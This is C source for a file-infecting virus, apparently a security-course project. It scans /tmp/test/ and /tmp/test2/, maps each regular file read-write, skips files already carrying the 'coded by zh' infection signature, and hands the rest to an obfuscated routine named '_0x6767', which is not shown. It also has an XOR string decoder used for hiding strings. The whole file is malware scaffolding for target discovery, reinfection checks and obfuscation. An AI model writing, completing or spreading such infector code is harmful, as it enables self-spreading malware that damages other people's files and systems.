#include "pestilence.h"

static void been_integrated(char *dst, const unsigned char *enc, size_t len, unsigned char key)
{
    for (size_t i = 0; i < len; i++)
        dst[i] = enc[i] ^ key;
    dst[len] = '\0';
}

char *build_path(const char *dir, const char *filename)
{
    size_t len = strlen(dir) + strlen(filename) + 2;
    char *path = malloc(len);
    if (!path)
        return NULL;
    strcpy(path, dir);
    strcat(path, filename);
    return path;
}

int is_already_infected(void *file, size_t file_size)
{
    const char *SIGNATURE = "coded by zh";
    if (file_size < strlen(SIGNATURE))
        return 0;
    void *found = memmem(file, file_size, SIGNATURE, strlen(SIGNATURE));
    return (found != NULL);
}


int find_and_map_target(t_woody *env, const char *dir_path)
{
    DIR *dir = opendir(dir_path);
    if (!dir)
        return -1;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL)
    {
        if (entry->d_type != DT_REG)
            continue;
        char *filepath = build_path(dir_path, entry->d_name);
        if (!filepath)
            continue;
        int fd = open(filepath, O_RDWR);
        if (fd < 0)
        {
            free(filepath);
            continue;
        }
        off_t size = lseek(fd, 0, SEEK_END);
        if (size == 0)
        {
            close(fd);
            free(filepath);
            continue;
        }
        void *data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        close(fd);

        if (data == MAP_FAILED)
        {
            free(filepath);
            continue;
        }
        if (is_already_infected(data, size))
        {
            munmap(data, size);
            free(filepath);
            continue;
        }
        env->file_data = data;
        env->file_size = size;
        free(filepath);
        if (_0x6767(env))
            break;
    }
    closedir(dir);
    return -1;
}

int main()
{
    t_woody env = {0};
    if (find_and_map_target(&env, "/tmp/test/") != 0)
    {
        if (find_and_map_target(&env, "/tmp/test2/") != 0)
            return 1;
    }
    return 0;
}